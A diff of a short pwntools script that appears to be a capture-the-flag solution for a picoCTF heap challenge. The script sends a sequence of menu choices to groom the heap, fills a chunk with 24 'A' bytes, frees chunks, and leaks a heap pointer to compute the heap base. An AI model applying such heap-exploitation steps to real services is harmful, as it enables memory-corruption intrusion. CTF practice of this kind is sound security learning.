@@ -1,36 +1,20 @@
 from pwn import *
 
-'''
-Allowed calls:
-sys_read
-sys_write
-sys_open
-sys_exit
-sys_exit_group
-sys_fstat
-
-1st input: 0 <= n1 <= 4
-2nd input: 0 <= n2 <= 15
-
-choice based on 1st input
-'''
-
-HOST, PORT = '0.0.0.0', 31337
+HOST, PORT = 'mars.picoctf.net', 31638
 r = remote(HOST, PORT)
 
-r.send('0\n0\n1\n')
-r.send('0\n1\n1\n')
-r.send('0\n2\n1\n')
-
-r.send(b'1\n0\n1\n65\n')
-r.send(b'2\n0\n')
-
-r.send('4\n2\n')
-r.send('4\n1\n')
-r.send('4\n0\n')
-
-
-
-pause()
+r.sendlineafter('choice: \n', '0 0 0')
+r.sendlineafter('choice: \n' , '1 0 24')
+r.sendline(' '.join(['65' for i in range(24)]))
+for i in range(6):
+    r.sendlineafter('choice: \n', f'0 {i+1} 0')
+r.sendlineafter('choice: \n', '4 1')
+r.sendlineafter('choice: \n', '4 2')
+r.sendlineafter('choice: \n', '4 0')
+r.sendline('2 0')
+r.recvuntil('choice: \n')
+heap_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
+heap = heap_leak - 0x13cf0
+print(hex(heap))
 
 r.interactive()
